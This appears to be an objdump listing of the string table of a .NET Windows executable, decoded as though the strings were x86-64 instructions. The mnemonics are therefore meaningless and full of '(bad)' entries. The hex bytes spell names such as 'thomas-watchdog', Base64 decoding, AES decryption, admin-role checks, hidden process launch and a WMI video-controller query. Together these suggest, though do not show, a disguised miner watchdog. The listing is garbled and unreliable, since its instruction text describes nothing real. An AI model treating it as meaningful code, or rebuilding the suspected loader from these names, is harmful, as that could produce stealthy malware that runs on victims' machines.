   140002b43:	65 6c                	gs insb (%dx),(%rdi)
   140002b45:	61                   	(bad)
   140002b46:	78 61                	js     0x140002ba9
   140002b48:	74 69                	je     0x140002bb3
   140002b4a:	6f                   	outsl  (%rsi),(%dx)
   140002b4b:	6e                   	outsb  (%rsi),(%dx)
   140002b4c:	73 41                	jae    0x140002b8f
   140002b4e:	74 74                	je     0x140002bc4
   140002b50:	72 69                	jb     0x140002bbb
   140002b52:	62 75 74 65 00       	(bad)
   140002b57:	52                   	push   %rdx
   140002b58:	75 6e                	jne    0x140002bc8
   140002b5a:	74 69                	je     0x140002bc5
   140002b5c:	6d                   	insl   (%dx),(%rdi)
   140002b5d:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140002b60:	6d                   	insl   (%dx),(%rdi)
   140002b61:	70 61                	jo     0x140002bc4
   140002b63:	74 69                	je     0x140002bce
   140002b65:	62 69 6c 69 74       	(bad)
   140002b6a:	79 41                	jns    0x140002bad
   140002b6c:	74 74                	je     0x140002be2
   140002b6e:	72 69                	jb     0x140002bd9
   140002b70:	62 75 74 65 00       	(bad)
   140002b75:	74 68                	je     0x140002bdf
   140002b77:	6f                   	outsl  (%rsi),(%dx)
   140002b78:	6d                   	insl   (%dx),(%rdi)
   140002b79:	61                   	(bad)
   140002b7a:	73 2d                	jae    0x140002ba9
   140002b7c:	77 61                	ja     0x140002bdf
   140002b7e:	74 63                	je     0x140002be3
   140002b80:	68 64 6f 67 00       	push   $0x676f64
   140002b85:	53                   	push   %rbx
   140002b86:	79 73                	jns    0x140002bfb
   140002b88:	74 65                	je     0x140002bef
   140002b8a:	6d                   	insl   (%dx),(%rdi)
   140002b8b:	2e 49                	cs rex.WB
   140002b8d:	4f 00 46 69          	rex.WRXB add %r8b,0x69(%r14)
   140002b91:	6c                   	insb   (%dx),(%rdi)
   140002b92:	65 00 52 65          	add    %dl,%gs:0x65(%rdx)
   140002b96:	61                   	(bad)
   140002b97:	64 41 6c             	fs rex.B insb (%dx),(%rdi)
   140002b9a:	6c                   	insb   (%dx),(%rdi)
   140002b9b:	42 79 74             	rex.X jns 0x140002c12
   140002b9e:	65 73 00             	gs jae 0x140002ba1
   140002ba1:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140002ba3:	76 69                	jbe    0x140002c0e
   140002ba5:	72 6f                	jb     0x140002c16
   140002ba7:	6e                   	outsb  (%rsi),(%dx)
   140002ba8:	6d                   	insl   (%dx),(%rdi)
   140002ba9:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002bab:	74 00                	je     0x140002bad
   140002bad:	45 78 69             	rex.RB js 0x140002c19
   140002bb0:	74 00                	je     0x140002bb2
   140002bb2:	45 78 63             	rex.RB js 0x140002c18
   140002bb5:	65 70 74             	gs jo  0x140002c2c
   140002bb8:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%rdi),%ebp
   140002bbf:	74 65                	je     0x140002c26
   140002bc1:	6d                   	insl   (%dx),(%rdi)
   140002bc2:	2e 4d 61             	cs rex.WRB (bad)
   140002bc5:	6e                   	outsb  (%rsi),(%dx)
   140002bc6:	61                   	(bad)
   140002bc7:	67 65 6d             	gs insl (%dx),(%edi)
   140002bca:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002bcc:	74 00                	je     0x140002bce
   140002bce:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140002bd0:	6e                   	outsb  (%rsi),(%dx)
   140002bd1:	6e                   	outsb  (%rsi),(%dx)
   140002bd2:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140002bd7:	6e                   	outsb  (%rsi),(%dx)
   140002bd8:	4f 70 74             	rex.WRXB jo 0x140002c4f
   140002bdb:	69 6f 6e 73 00 49 6d 	imul   $0x6d490073,0x6e(%rdi),%ebp
   140002be2:	70 65                	jo     0x140002c49
   140002be4:	72 73                	jb     0x140002c59
   140002be6:	6f                   	outsl  (%rsi),(%dx)
   140002be7:	6e                   	outsb  (%rsi),(%dx)
   140002be8:	61                   	(bad)
   140002be9:	74 69                	je     0x140002c54
   140002beb:	6f                   	outsl  (%rsi),(%dx)
   140002bec:	6e                   	outsb  (%rsi),(%dx)
   140002bed:	4c                   	rex.WR
   140002bee:	65 76 65             	gs jbe 0x140002c56
   140002bf1:	6c                   	insb   (%dx),(%rdi)
   140002bf2:	00 73 65             	add    %dh,0x65(%rbx)
   140002bf5:	74 5f                	je     0x140002c56
   140002bf7:	49 6d                	rex.WB insl (%dx),(%rdi)
   140002bf9:	70 65                	jo     0x140002c60
   140002bfb:	72 73                	jb     0x140002c70
   140002bfd:	6f                   	outsl  (%rsi),(%dx)
   140002bfe:	6e                   	outsb  (%rsi),(%dx)
   140002bff:	61                   	(bad)
   140002c00:	74 69                	je     0x140002c6b
   140002c02:	6f                   	outsl  (%rsi),(%dx)
   140002c03:	6e                   	outsb  (%rsi),(%dx)
   140002c04:	00 4d 61             	add    %cl,0x61(%rbp)
   140002c07:	6e                   	outsb  (%rsi),(%dx)
   140002c08:	61                   	(bad)
   140002c09:	67 65 6d             	gs insl (%dx),(%edi)
   140002c0c:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002c0e:	74 53                	je     0x140002c63
   140002c10:	63 6f 70             	movsxd 0x70(%rdi),%ebp
   140002c13:	65 00 43 6f          	add    %al,%gs:0x6f(%rbx)
   140002c17:	6e                   	outsb  (%rsi),(%dx)
   140002c18:	6e                   	outsb  (%rsi),(%dx)
   140002c19:	65 63 74 00 4f       	movsxd %gs:0x4f(%rax,%rax,1),%esi
   140002c1e:	62 6a 65 63 74       	(bad)
   140002c23:	51                   	push   %rcx
   140002c24:	75 65                	jne    0x140002c8b
   140002c26:	72 79                	jb     0x140002ca1
   140002c28:	00 4d 61             	add    %cl,0x61(%rbp)
   140002c2b:	6e                   	outsb  (%rsi),(%dx)
   140002c2c:	61                   	(bad)
   140002c2d:	67 65 6d             	gs insl (%dx),(%edi)
   140002c30:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002c32:	74 4f                	je     0x140002c83
   140002c34:	62 6a 65 63 74       	(bad)
   140002c39:	53                   	push   %rbx
   140002c3a:	65 61                	gs (bad)
   140002c3c:	72 63                	jb     0x140002ca1
   140002c3e:	68 65 72 00 4d       	push   $0x4d007265
   140002c43:	61                   	(bad)
   140002c44:	6e                   	outsb  (%rsi),(%dx)
   140002c45:	61                   	(bad)
   140002c46:	67 65 6d             	gs insl (%dx),(%edi)
   140002c49:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002c4b:	74 4f                	je     0x140002c9c
   140002c4d:	62 6a 65 63 74       	(bad)
   140002c52:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140002c54:	6c                   	insb   (%dx),(%rdi)
   140002c55:	6c                   	insb   (%dx),(%rdi)
   140002c56:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140002c5b:	6e                   	outsb  (%rsi),(%dx)
   140002c5c:	00 47 65             	add    %al,0x65(%rdi)
   140002c5f:	74 00                	je     0x140002c61
   140002c61:	4d 61                	rex.WRB (bad)
   140002c63:	6e                   	outsb  (%rsi),(%dx)
   140002c64:	61                   	(bad)
   140002c65:	67 65 6d             	gs insl (%dx),(%edi)
   140002c68:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002c6a:	74 4f                	je     0x140002cbb
   140002c6c:	62 6a 65 63 74       	(bad)
   140002c71:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140002c73:	75 6d                	jne    0x140002ce2
   140002c75:	65 72 61             	gs jb  0x140002cd9
   140002c78:	74 6f                	je     0x140002ce9
   140002c7a:	72 00                	jb     0x140002c7c
   140002c7c:	47                   	rex.RXB
   140002c7d:	65 74 45             	gs je  0x140002cc5
   140002c80:	6e                   	outsb  (%rsi),(%dx)
   140002c81:	75 6d                	jne    0x140002cf0
   140002c83:	65 72 61             	gs jb  0x140002ce7
   140002c86:	74 6f                	je     0x140002cf7
   140002c88:	72 00                	jb     0x140002c8a
   140002c8a:	4d 61                	rex.WRB (bad)
   140002c8c:	6e                   	outsb  (%rsi),(%dx)
   140002c8d:	61                   	(bad)
   140002c8e:	67 65 6d             	gs insl (%dx),(%edi)
   140002c91:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002c93:	74 42                	je     0x140002cd7
   140002c95:	61                   	(bad)
   140002c96:	73 65                	jae    0x140002cfd
   140002c98:	4f 62 6a 65 63 74    	(bad)
   140002c9e:	00 67 65             	add    %ah,0x65(%rdi)
   140002ca1:	74 5f                	je     0x140002d02
   140002ca3:	43 75 72             	rex.XB jne 0x140002d18
   140002ca6:	72 65                	jb     0x140002d0d
   140002ca8:	6e                   	outsb  (%rsi),(%dx)
   140002ca9:	74 00                	je     0x140002cab
   140002cab:	4d 61                	rex.WRB (bad)
   140002cad:	6e                   	outsb  (%rsi),(%dx)
   140002cae:	61                   	(bad)
   140002caf:	67 65 6d             	gs insl (%dx),(%edi)
   140002cb2:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002cb4:	74 4f                	je     0x140002d05
   140002cb6:	62 6a 65 63 74       	(bad)
   140002cbb:	00 67 65             	add    %ah,0x65(%rdi)
   140002cbe:	74 5f                	je     0x140002d1f
   140002cc0:	49 74 65             	rex.WB je 0x140002d28
   140002cc3:	6d                   	insl   (%dx),(%rdi)
   140002cc4:	00 53 74             	add    %dl,0x74(%rbx)
   140002cc7:	72 69                	jb     0x140002d32
   140002cc9:	6e                   	outsb  (%rsi),(%dx)
   140002cca:	67 00 43 6f          	add    %al,0x6f(%ebx)
   140002cce:	6e                   	outsb  (%rsi),(%dx)
   140002ccf:	63 61 74             	movsxd 0x74(%rcx),%esp
   140002cd2:	00 4d 6f             	add    %cl,0x6f(%rbp)
   140002cd5:	76 65                	jbe    0x140002d3c
   140002cd7:	4e                   	rex.WRX
   140002cd8:	65 78 74             	gs js  0x140002d4f
   140002cdb:	00 49 44             	add    %cl,0x44(%rcx)
   140002cde:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%rbx),%esi
   140002ce5:	6c                   	insb   (%dx),(%rdi)
   140002ce6:	65 00 44 69 73       	add    %al,%gs:0x73(%rcx,%rbp,2)
   140002ceb:	70 6f                	jo     0x140002d5c
   140002ced:	73 65                	jae    0x140002d54
   140002cef:	00 46 6f             	add    %al,0x6f(%rsi)
   140002cf2:	72 6d                	jb     0x140002d61
   140002cf4:	61                   	(bad)
   140002cf5:	74 00                	je     0x140002cf7
   140002cf7:	54                   	push   %rsp
   140002cf8:	6f                   	outsl  (%rsi),(%dx)
   140002cf9:	53                   	push   %rbx
   140002cfa:	74 72                	je     0x140002d6e
   140002cfc:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%rsi),%ebp
   140002d03:	74 61                	je     0x140002d66
   140002d05:	69 6e 73 00 45 78 69 	imul   $0x69784500,0x73(%rsi),%ebp
   140002d0c:	73 74                	jae    0x140002d82
   140002d0e:	73 00                	jae    0x140002d10
   140002d10:	53                   	push   %rbx
   140002d11:	74 72                	je     0x140002d85
   140002d13:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%rsi),%ebp
   140002d1a:	61                   	(bad)
   140002d1b:	72 69                	jb     0x140002d86
   140002d1d:	73 6f                	jae    0x140002d8e
   140002d1f:	6e                   	outsb  (%rsi),(%dx)
   140002d20:	00 49 6e             	add    %cl,0x6e(%rcx)
   140002d23:	64 65 78 4f          	fs gs js 0x140002d76
   140002d27:	66 00 57 72          	data16 add %dl,0x72(%rdi)
   140002d2b:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%rbp,%riz,2),%esi
   140002d32:	79 
   140002d33:	74 65                	je     0x140002d9a
   140002d35:	73 00                	jae    0x140002d37
   140002d37:	53                   	push   %rbx
   140002d38:	79 73                	jns    0x140002dad
   140002d3a:	74 65                	je     0x140002da1
   140002d3c:	6d                   	insl   (%dx),(%rdi)
   140002d3d:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
   140002d44:	73 74 
   140002d46:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%rbx),%esp
   140002d4d:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002d50:	73 53                	jae    0x140002da5
   140002d52:	74 61                	je     0x140002db5
   140002d54:	72 74                	jb     0x140002dca
   140002d56:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140002d58:	66 6f                	outsw  (%rsi),(%dx)
   140002d5a:	00 73 65             	add    %dh,0x65(%rbx)
   140002d5d:	74 5f                	je     0x140002dbe
   140002d5f:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140002d66:	65 00 
   140002d68:	50                   	push   %rax
   140002d69:	72 6f                	jb     0x140002dda
   140002d6b:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002d6e:	73 57                	jae    0x140002dc7
   140002d70:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
   140002d77:	79 6c                	jns    0x140002de5
   140002d79:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002d7d:	74 5f                	je     0x140002dde
   140002d7f:	57                   	push   %rdi
   140002d80:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
   140002d87:	79 6c                	jns    0x140002df5
   140002d89:	65 00 50 61          	add    %dl,%gs:0x61(%rax)
   140002d8d:	74 68                	je     0x140002df7
   140002d8f:	00 47 65             	add    %al,0x65(%rdi)
   140002d92:	74 44                	je     0x140002dd8
   140002d94:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
   140002d9b:	79 4e                	jns    0x140002deb
   140002d9d:	61                   	(bad)
   140002d9e:	6d                   	insl   (%dx),(%rdi)
   140002d9f:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002da3:	74 5f                	je     0x140002e04
   140002da5:	57                   	push   %rdi
   140002da6:	6f                   	outsl  (%rsi),(%dx)
   140002da7:	72 6b                	jb     0x140002e14
   140002da9:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%rsi),%ebp
   140002db0:	63 74 6f 72          	movsxd 0x72(%rdi,%rbp,2),%esi
   140002db4:	79 00                	jns    0x140002db6
   140002db6:	73 65                	jae    0x140002e1d
   140002db8:	74 5f                	je     0x140002e19
   140002dba:	43 72 65             	rex.XB jb 0x140002e22
   140002dbd:	61                   	(bad)
   140002dbe:	74 65                	je     0x140002e25
   140002dc0:	4e 6f                	rex.WRX outsl (%rsi),(%dx)
   140002dc2:	57                   	push   %rdi
   140002dc3:	69 6e 64 6f 77 00 50 	imul   $0x5000776f,0x64(%rsi),%ebp
   140002dca:	72 6f                	jb     0x140002e3b
   140002dcc:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002dcf:	73 00                	jae    0x140002dd1
   140002dd1:	53                   	push   %rbx
   140002dd2:	74 61                	je     0x140002e35
   140002dd4:	72 74                	jb     0x140002e4a
   140002dd6:	00 53 79             	add    %dl,0x79(%rbx)
   140002dd9:	73 74                	jae    0x140002e4f
   140002ddb:	65 6d                	gs insl (%dx),(%rdi)
   140002ddd:	2e 54                	cs push %rsp
   140002ddf:	68 72 65 61 64       	push   $0x64616572
   140002de4:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%rsi),%ebp
   140002deb:	65 61                	gs (bad)
   140002ded:	64 00 53 6c          	add    %dl,%fs:0x6c(%rbx)
   140002df1:	65 65 70 00          	gs gs jo 0x140002df5
   140002df5:	53                   	push   %rbx
   140002df6:	79 73                	jns    0x140002e6b
   140002df8:	74 65                	je     0x140002e5f
   140002dfa:	6d                   	insl   (%dx),(%rdi)
   140002dfb:	2e 54                	cs push %rsp
   140002dfd:	65 78 74             	gs js  0x140002e74
   140002e00:	00 45 6e             	add    %al,0x6e(%rbp)
   140002e03:	63 6f 64             	movsxd 0x64(%rdi),%ebp
   140002e06:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%rsi),%ebp
   140002e0d:	5f                   	pop    %rdi
   140002e0e:	41 53                	push   %r11
   140002e10:	43                   	rex.XB
   140002e11:	49                   	rex.WB
   140002e12:	49 00 43 6f          	rex.WB add %al,0x6f(%r11)
   140002e16:	6e                   	outsb  (%rsi),(%dx)
   140002e17:	76 65                	jbe    0x140002e7e
   140002e19:	72 74                	jb     0x140002e8f
   140002e1b:	00 46 72             	add    %al,0x72(%rsi)
   140002e1e:	6f                   	outsl  (%rsi),(%dx)
   140002e1f:	6d                   	insl   (%dx),(%rdi)
   140002e20:	42 61                	rex.X (bad)
   140002e22:	73 65                	jae    0x140002e89
   140002e24:	36 34 53             	ss xor $0x53,%al
   140002e27:	74 72                	je     0x140002e9b
   140002e29:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%rsi),%ebp
   140002e30:	53                   	push   %rbx
   140002e31:	74 72                	je     0x140002ea5
   140002e33:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%rsi),%ebp
   140002e3a:	42 79 74             	rex.X jns 0x140002eb1
   140002e3d:	65 73 00             	gs jae 0x140002e40
   140002e40:	53                   	push   %rbx
   140002e41:	79 73                	jns    0x140002eb6
   140002e43:	74 65                	je     0x140002eaa
   140002e45:	6d                   	insl   (%dx),(%rdi)
   140002e46:	2e 53                	cs push %rbx
   140002e48:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140002e4c:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%rcx,%rdi,2),%esi
   140002e53:	70 
   140002e54:	74 6f                	je     0x140002ec5
   140002e56:	67 72 61             	addr32 jb 0x140002eba
   140002e59:	70 68                	jo     0x140002ec3
   140002e5b:	79 00                	jns    0x140002e5d
   140002e5d:	52                   	push   %rdx
   140002e5e:	66 63 32             	movsxd (%rdx),%si
   140002e61:	38 39                	cmp    %bh,(%rcx)
   140002e63:	38 44 65 72          	cmp    %al,0x72(%rbp,%riz,2)
   140002e67:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%rsi),%esi
   140002e6e:	73 00                	jae    0x140002e70
   140002e70:	52                   	push   %rdx
   140002e71:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%rdx),%ebp
   140002e78:	4d 61                	rex.WRB (bad)
   140002e7a:	6e                   	outsb  (%rsi),(%dx)
   140002e7b:	61                   	(bad)
   140002e7c:	67 65 64 00 53 79    	gs add %dl,%fs:0x79(%ebx)
   140002e82:	6d                   	insl   (%dx),(%rdi)
   140002e83:	6d                   	insl   (%dx),(%rdi)
   140002e84:	65 74 72             	gs je  0x140002ef9
   140002e87:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%rbx),%esp
   140002e8e:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%rax,%rbp,2),%esi
   140002e95:	74 
   140002e96:	5f                   	pop    %rdi
   140002e97:	4b                   	rex.WXB
   140002e98:	65 79 53             	gs jns 0x140002eee
   140002e9b:	69 7a 65 00 43 69 70 	imul   $0x70694300,0x65(%rdx),%edi
   140002ea2:	68 65 72 4d 6f       	push   $0x6f4d7265
   140002ea7:	64 65 00 73 65       	fs add %dh,%gs:0x65(%rbx)
   140002eac:	74 5f                	je     0x140002f0d
   140002eae:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140002eb0:	64 65 00 44 65 72    	fs add %al,%gs:0x72(%rbp,%riz,2)
   140002eb6:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%rsi),%esi
   140002ebd:	73 00                	jae    0x140002ebf
   140002ebf:	49                   	rex.WB
   140002ec0:	43 72 79             	rex.XB jb 0x140002f3c
   140002ec3:	70 74                	jo     0x140002f39
   140002ec5:	6f                   	outsl  (%rsi),(%dx)
   140002ec6:	54                   	push   %rsp
   140002ec7:	72 61                	jb     0x140002f2a
   140002ec9:	6e                   	outsb  (%rsi),(%dx)
   140002eca:	73 66                	jae    0x140002f32
   140002ecc:	6f                   	outsl  (%rsi),(%dx)
   140002ecd:	72 6d                	jb     0x140002f3c
   140002ecf:	00 43 72             	add    %al,0x72(%rbx)
   140002ed2:	65 61                	gs (bad)
   140002ed4:	74 65                	je     0x140002f3b
   140002ed6:	44                   	rex.R
   140002ed7:	65 63 72 79          	movsxd %gs:0x79(%rdx),%esi
   140002edb:	70 74                	jo     0x140002f51
   140002edd:	6f                   	outsl  (%rsi),(%dx)
   140002ede:	72 00                	jb     0x140002ee0
   140002ee0:	43 72 65             	rex.XB jb 0x140002f48
   140002ee3:	61                   	(bad)
   140002ee4:	74 65                	je     0x140002f4b
   140002ee6:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140002ee8:	63 72 79             	movsxd 0x79(%rdx),%esi
   140002eeb:	70 74                	jo     0x140002f61
   140002eed:	6f                   	outsl  (%rsi),(%dx)
   140002eee:	72 00                	jb     0x140002ef0
   140002ef0:	4d                   	rex.WRB
   140002ef1:	65 6d                	gs insl (%dx),(%rdi)
   140002ef3:	6f                   	outsl  (%rsi),(%dx)
   140002ef4:	72 79                	jb     0x140002f6f
   140002ef6:	53                   	push   %rbx
   140002ef7:	74 72                	je     0x140002f6b
   140002ef9:	65 61                	gs (bad)
   140002efb:	6d                   	insl   (%dx),(%rdi)
   140002efc:	00 43 72             	add    %al,0x72(%rbx)
   140002eff:	79 70                	jns    0x140002f71
   140002f01:	74 6f                	je     0x140002f72
   140002f03:	53                   	push   %rbx
   140002f04:	74 72                	je     0x140002f78
   140002f06:	65 61                	gs (bad)
   140002f08:	6d                   	insl   (%dx),(%rdi)
   140002f09:	00 53 74             	add    %dl,0x74(%rbx)
   140002f0c:	72 65                	jb     0x140002f73
   140002f0e:	61                   	(bad)
   140002f0f:	6d                   	insl   (%dx),(%rdi)
   140002f10:	00 43 72             	add    %al,0x72(%rbx)
   140002f13:	79 70                	jns    0x140002f85
   140002f15:	74 6f                	je     0x140002f86
   140002f17:	53                   	push   %rbx
   140002f18:	74 72                	je     0x140002f8c
   140002f1a:	65 61                	gs (bad)
   140002f1c:	6d                   	insl   (%dx),(%rdi)
   140002f1d:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140002f1f:	64 65 00 57 72       	fs add %dl,%gs:0x72(%rdi)
   140002f24:	69 74 65 00 43 6c 6f 	imul   $0x736f6c43,0x0(%rbp,%riz,2),%esi
   140002f2b:	73 
   140002f2c:	65 00 54 6f 41       	add    %dl,%gs:0x41(%rdi,%rbp,2)
   140002f31:	72 72                	jb     0x140002fa5
   140002f33:	61                   	(bad)
   140002f34:	79 00                	jns    0x140002f36
   140002f36:	73 65                	jae    0x140002f9d
   140002f38:	74 5f                	je     0x140002f99
   140002f3a:	41 72 67             	rex.B jb 0x140002fa4
   140002f3d:	75 6d                	jne    0x140002fac
   140002f3f:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002f41:	74 73                	je     0x140002fb6
   140002f43:	00 67 65             	add    %ah,0x65(%rdi)
   140002f46:	74 5f                	je     0x140002fa7
   140002f48:	53                   	push   %rbx
   140002f49:	79 73                	jns    0x140002fbe
   140002f4b:	74 65                	je     0x140002fb2
   140002f4d:	6d                   	insl   (%dx),(%rdi)
   140002f4e:	44 69 72 65 63 74 6f 	imul   $0x726f7463,0x65(%rdx),%r14d
   140002f55:	72 
   140002f56:	79 00                	jns    0x140002f58
   140002f58:	73 65                	jae    0x140002fbf
   140002f5a:	74 5f                	je     0x140002fbb
   140002f5c:	55                   	push   %rbp
   140002f5d:	73 65                	jae    0x140002fc4
   140002f5f:	53                   	push   %rbx
   140002f60:	68 65 6c 6c 45       	push   $0x456c6c65
   140002f65:	78 65                	js     0x140002fcc
   140002f67:	63 75 74             	movsxd 0x74(%rbp),%esi
   140002f6a:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002f6e:	74 5f                	je     0x140002fcf
   140002f70:	52                   	push   %rdx
   140002f71:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%rdx),%esi
   140002f78:	53 74 
   140002f7a:	61                   	(bad)
   140002f7b:	6e                   	outsb  (%rsi),(%dx)
   140002f7c:	64 61                	fs (bad)
   140002f7e:	72 64                	jb     0x140002fe4
   140002f80:	4f 75 74             	rex.WRXB jne 0x140002ff7
   140002f83:	70 75                	jo     0x140002ffa
   140002f85:	74 00                	je     0x140002f87
   140002f87:	2e 63 63 74          	cs movsxd 0x74(%rbx),%esp
   140002f8b:	6f                   	outsl  (%rsi),(%dx)
   140002f8c:	72 00                	jb     0x140002f8e
   140002f8e:	42 79 74             	rex.X jns 0x140003005
   140002f91:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   140002f95:	73 74                	jae    0x14000300b
   140002f97:	65 6d                	gs insl (%dx),(%rdi)
   140002f99:	2e 53                	cs push %rbx
   140002f9b:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140002f9f:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%rcx,%rdi,2),%esi
   140002fa6:	6e 
   140002fa7:	63 69 70             	movsxd 0x70(%rcx),%ebp
   140002faa:	61                   	(bad)
   140002fab:	6c                   	insb   (%dx),(%rdi)
   140002fac:	00 57 69             	add    %dl,0x69(%rdi)
   140002faf:	6e                   	outsb  (%rsi),(%dx)
   140002fb0:	64 6f                	outsl  %fs:(%rsi),(%dx)
   140002fb2:	77 73                	ja     0x140003027
   140002fb4:	49                   	rex.WB
   140002fb5:	64 65 6e             	fs outsb %gs:(%rsi),(%dx)
   140002fb8:	74 69                	je     0x140003023
   140002fba:	74 79                	je     0x140003035
   140002fbc:	00 47 65             	add    %al,0x65(%rdi)
   140002fbf:	74 43                	je     0x140003004
   140002fc1:	75 72                	jne    0x140003035
   140002fc3:	72 65                	jb     0x14000302a
   140002fc5:	6e                   	outsb  (%rsi),(%dx)
   140002fc6:	74 00                	je     0x140002fc8
   140002fc8:	57                   	push   %rdi
   140002fc9:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%rsi),%ebp
   140002fd0:	72 69                	jb     0x14000303b
   140002fd2:	6e                   	outsb  (%rsi),(%dx)
   140002fd3:	63 69 70             	movsxd 0x70(%rcx),%ebp
   140002fd6:	61                   	(bad)
   140002fd7:	6c                   	insb   (%dx),(%rdi)
   140002fd8:	00 57 69             	add    %dl,0x69(%rdi)
   140002fdb:	6e                   	outsb  (%rsi),(%dx)
   140002fdc:	64 6f                	outsl  %fs:(%rsi),(%dx)
   140002fde:	77 73                	ja     0x140003053
   140002fe0:	42 75 69             	rex.X jne 0x14000304c
   140002fe3:	6c                   	insb   (%dx),(%rdi)
   140002fe4:	74 49                	je     0x14000302f
   140002fe6:	6e                   	outsb  (%rsi),(%dx)
   140002fe7:	52                   	push   %rdx
   140002fe8:	6f                   	outsl  (%rsi),(%dx)
   140002fe9:	6c                   	insb   (%dx),(%rdi)
   140002fea:	65 00 49 73          	add    %cl,%gs:0x73(%rcx)
   140002fee:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140002ff0:	52                   	push   %rdx
   140002ff1:	6f                   	outsl  (%rsi),(%dx)
   140002ff2:	6c                   	insb   (%dx),(%rdi)
   140002ff3:	65 00 53 70          	add    %dl,%gs:0x70(%rbx)
   140002ff7:	65 63 69 61          	movsxd %gs:0x61(%rcx),%ebp
   140002ffb:	6c                   	insb   (%dx),(%rdi)
   140002ffc:	46 6f                	rex.RX outsl (%rsi),(%dx)
   140002ffe:	6c                   	insb   (%dx),(%rdi)
   140002fff:	64 65 72 00          	fs gs jb 0x140003003
   140003003:	47                   	rex.RXB
   140003004:	65 74 46             	gs je  0x14000304d
   140003007:	6f                   	outsl  (%rsi),(%dx)
   140003008:	6c                   	insb   (%dx),(%rdi)
   140003009:	64 65 72 50          	fs gs jb 0x14000305d
   14000300d:	61                   	(bad)
   14000300e:	74 68                	je     0x140003078
   140003010:	00 43 6f             	add    %al,0x6f(%rbx)
   140003013:	6d                   	insl   (%dx),(%rdi)
   140003014:	62 69 6e 65 00       	(bad)
   140003019:	00 00                	add    %al,(%rax)
   14000301b:	00 00                	add    %al,(%rax)
   14000301d:	01 00                	add    %eax,(%rax)
   14000301f:	17                   	(bad)
   140003020:	5c                   	pop    %rsp
   140003021:	00 72 00             	add    %dh,0x0(%rdx)
   140003024:	6f                   	outsl  (%rsi),(%dx)
   140003025:	00 6f 00             	add    %ch,0x0(%rdi)
   140003028:	74 00                	je     0x14000302a
   14000302a:	5c                   	pop    %rsp
   14000302b:	00 63 00             	add    %ah,0x0(%rbx)
   14000302e:	69 00 6d 00 76 00    	imul   $0x76006d,(%rax),%eax
   140003034:	32 00                	xor    (%rax),%al
   140003036:	00 6d 53             	add    %ch,0x53(%rbp)
   140003039:	00 45 00             	add    %al,0x0(%rbp)
   14000303c:	4c 00 45 00          	rex.WR add %r8b,0x0(%rbp)
   140003040:	43 00 54 00 20       	add    %dl,0x20(%r8,%r8,1)
   140003045:	00 4e 00             	add    %cl,0x0(%rsi)
   140003048:	61                   	(bad)
   140003049:	00 6d 00             	add    %ch,0x0(%rbp)
   14000304c:	65 00 2c 00          	add    %ch,%gs:(%rax,%rax,1)
   140003050:	20 00                	and    %al,(%rax)
   140003052:	56                   	push   %rsi
   140003053:	00 69 00             	add    %ch,0x0(%rcx)
   140003056:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   14000305a:	6f                   	outsl  (%rsi),(%dx)
   14000305b:	00 50 00             	add    %dl,0x0(%rax)
   14000305e:	72 00                	jb     0x140003060
   140003060:	6f                   	outsl  (%rsi),(%dx)
   140003061:	00 63 00             	add    %ah,0x0(%rbx)
   140003064:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140003068:	73 00                	jae    0x14000306a
